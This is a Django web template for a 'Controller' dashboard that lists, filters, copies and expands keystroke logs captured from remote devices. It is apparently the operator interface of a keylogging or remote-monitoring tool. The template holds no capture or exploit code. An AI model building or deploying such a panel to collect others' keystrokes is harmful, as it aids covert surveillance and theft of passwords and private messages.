{% extends 'base.html' %}

{% block title %}Keylogs - Controller{% endblock %}
{% block page_title %}Keylogs{% endblock %}

{% block content %}
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
    <p style="color: var(--text-secondary); font-size: 14px;">
        Keylog data captured from devices
    </p>
    <div style="display: flex; gap: 12px; align-items: center;">
        <select id="deviceFilter" style="background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 8px 16px; color: var(--text-primary); font-size: 14px;" onchange="location.href='?device=' + this.value">
            <option value="">All Devices</option>
            {% for device in devices %}
            <option value="{{ device.device_id }}" {% if selected_device == device.device_id %}selected{% endif %}>{{ device.hostname }}</option>
            {% endfor %}
        </select>
        <button class="btn btn-secondary" onclick="location.reload()">
            <i class="ph ph-arrows-clockwise"></i>
            Refresh
        </button>
    </div>
</div>

<div class="card fade-in">
    <div class="card-body" style="padding: 0;">
        {% for keylog in keylogs %}
        <div style="border-bottom: 1px solid var(--border-color); padding: 20px 24px;">
            <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 16px;">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div style="width: 40px; height: 40px; background: var(--bg-tertiary); border-radius: var(--radius-sm); display: flex; align-items: center; justify-content: center;">
                        <i class="ph ph-desktop" style="font-size: 18px; color: var(--accent-primary);"></i>
                    </div>
                    <div>
                        <div style="font-weight: 500;">{{ keylog.device.hostname }}</div>
                        <div style="font-size: 12px; color: var(--text-muted);">
                            {{ keylog.start_time|date:"M d, Y H:i" }} - {{ keylog.end_time|date:"H:i" }}
                        </div>
                    </div>
                </div>
                <div style="display: flex; gap: 8px; align-items: center;">
                    <span class="badge badge-info">{{ keylog.character_count }} chars</span>
                    <span class="badge badge-success">{{ keylog.window_switches }} windows</span>
                    <button class="btn btn-secondary btn-icon btn-sm" title="Copy" onclick="copyKeylog(this)">
                        <i class="ph ph-copy"></i>
                    </button>
                    <button class="btn btn-secondary btn-icon btn-sm" title="Expand" onclick="toggleExpand(this)">
                        <i class="ph ph-caret-down"></i>
                    </button>
                </div>
            </div>
            <div class="keylog-content" style="position: relative;">
                <pre class="keylog-text" style="font-family: 'Consolas', 'Monaco', monospace; font-size: 13px; line-height: 1.6; color: var(--text-secondary); white-space: pre-wrap; word-wrap: break-word; max-height: 150px; overflow-y: hidden; background: var(--bg-primary); padding: 16px; border-radius: var(--radius-md); margin: 0; transition: max-height 0.3s;">{{ keylog.data }}</pre>
                <div class="keylog-fade" style="position: absolute; bottom: 0; left: 0; right: 0; height: 40px; background: linear-gradient(transparent, var(--bg-primary)); border-radius: 0 0 var(--radius-md) var(--radius-md); pointer-events: none;"></div>
            </div>
        </div>
        {% empty %}
        <div class="empty-state" style="padding: 80px 20px;">
            <i class="ph ph-keyboard" style="font-size: 64px;"></i>
            <h3 style="margin-top: 16px;">No keylog data</h3>
            <p>Keylog entries will appear here once devices start logging.</p>
        </div>
        {% endfor %}
    </div>
</div>

<!-- Pagination -->
{% if is_paginated %}
<div style="display: flex; justify-content: center; gap: 8px; margin-top: 24px;">
    {% if page_obj.has_previous %}
    <a href="?page={{ page_obj.previous_page_number }}" class="btn btn-secondary btn-sm">
        <i class="ph ph-caret-left"></i>
        Previous
    </a>
    {% endif %}
    <span style="padding: 8px 16px; color: var(--text-secondary);">
        Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages }}
    </span>
    {% if page_obj.has_next %}
    <a href="?page={{ page_obj.next_page_number }}" class="btn btn-secondary btn-sm">
        Next
        <i class="ph ph-caret-right"></i>
    </a>
    {% endif %}
</div>
{% endif %}
{% endblock %}

{% block extra_js %}
<script>
function copyKeylog(btn) {
    const text = btn.closest('div').parentElement.querySelector('.keylog-text').textContent;
    navigator.clipboard.writeText(text).then(() => {
        const icon = btn.querySelector('i');
        icon.className = 'ph ph-check';
        setTimeout(() => { icon.className = 'ph ph-copy'; }, 2000);
    });
}

function toggleExpand(btn) {
    const content = btn.closest('div').parentElement.nextElementSibling;
    const pre = content.querySelector('pre');
    const fade = content.querySelector('.keylog-fade');
    const icon = btn.querySelector('i');
    
    if (pre.style.maxHeight === 'none') {
        pre.style.maxHeight = '150px';
        fade.style.display = 'block';
        icon.className = 'ph ph-caret-down';
    } else {
        pre.style.maxHeight = 'none';
        fade.style.display = 'none';
        icon.className = 'ph ph-caret-up';
    }
}
</script>
{% endblock %}
